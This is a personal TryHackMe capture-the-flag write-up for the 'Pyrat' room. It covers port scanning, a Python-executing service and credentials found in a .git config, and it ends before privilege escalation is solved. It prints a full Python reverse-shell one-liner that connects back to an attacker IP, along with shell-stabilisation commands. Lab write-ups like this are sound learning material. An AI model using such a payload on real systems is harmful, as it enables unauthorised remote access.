Pyrat Tryhackme 23/11/2024
(This is a personal writeup to be consulted later)

#Enumeration  
We scan with nmap to see open ports and services :  
' sudo nmap -F -sV 10.10.178.180 '  
![image](https://github.com/user-attachments/assets/b6374aed-6089-4cf3-9298-4a0beb2769d4)  

we can see that there 2 open ports :  
Port 22 ssh and Port 8000 http-alt  

let's see what is running on the port 8000 using:  
'curl 10.10.178.180:8000'  
![image](https://github.com/user-attachments/assets/ec885b14-dc9e-442b-af08-9a299b4cf041)  

Try a basic connection means we need to use ' Netcat' : 
![image](https://github.com/user-attachments/assets/0d355efa-a531-485c-9395-b6b969a484bd)    
we can execute a python syntax , so we can try to obtain a reverse shell using python :  
'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.40.71",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'  
now I open 2 terminals , one wich nc listener to capture the shell and the other one with the payload :  
Terminal Netcat :  
![image](https://github.com/user-attachments/assets/23ccb97c-ca66-4331-922b-271f5611a143)    
Terminal Payload :  
![image](https://github.com/user-attachments/assets/b2536a10-e470-4170-a0b5-e709680c6318)


after running the payload , nc has successfully captured the shell 
now let's stabilize the shell :  
'python3 -c 'import pty; pty.spawn("/bin/bash")'  
'export TERM=xterm'  
press Ctrl+Z
'stty raw -echo'  
![image](https://github.com/user-attachments/assets/f03f1fe1-3b34-4fa3-a987-63a7765be1d5)  
we got our shell stabilized .  

# EXPLOITATION  
there is another user on the machine called 'think'  
![image](https://github.com/user-attachments/assets/aaf2e52a-ec85-4d83-a912-28d1dd438493)  
after some exploration I found a file called '.git' :  
![image](https://github.com/user-attachments/assets/6232f76a-4b9b-430b-871b-5b8b46eef99f)  
let's see what is contains :  
I find a config file inside the git , lets open it !  :  
![image](https://github.com/user-attachments/assets/e63e6504-4145-4985-8e48-1ed9426af45d)
![image](https://github.com/user-attachments/assets/c4a67a85-bcef-4b1d-bf00-4b54070e792f)  
as you can see, I got the username and the password !  (credentials)  
let's try these credentials  
![image](https://github.com/user-attachments/assets/e422380b-359a-4df0-ba4c-80a57c97f826)  
and yeah ! I got access
![image](https://github.com/user-attachments/assets/3ed4ec53-dde7-47be-a8c4-ebd9619a2908)  
and like that , I got the user flag .  
now I need to get the root part , and I think I will spend more time on it

# PRIVILEGE ESCALATION  

on the nmap scan , we got ssh port open , so let's try to access it : 
![image](https://github.com/user-attachments/assets/06736aab-de68-46fe-b854-9629bc5079c7)  
on the bottom , there is a line 'You have mail' , let's search for it and see what is contains :  
![image](https://github.com/user-attachments/assets/0aea640d-91c4-44ec-a259-e4fe6d48c0ed)  
let's see what is the RAT that they talking about , more investigation :   
![image](https://github.com/user-attachments/assets/f73bb6a1-ab5f-43de-b72e-4385487ce64c)  
the old version of the rat is being deleted , but we can restore it ! :  

![image](https://github.com/user-attachments/assets/4a0b9ba5-46e0-4409-b527-1ae4edc1dc72)  
now this in stage I need to write scripts and automates somethings to know the endpoints  
which I currently I'm not capable of ! maybe in the future I will come back to complete solving this room  












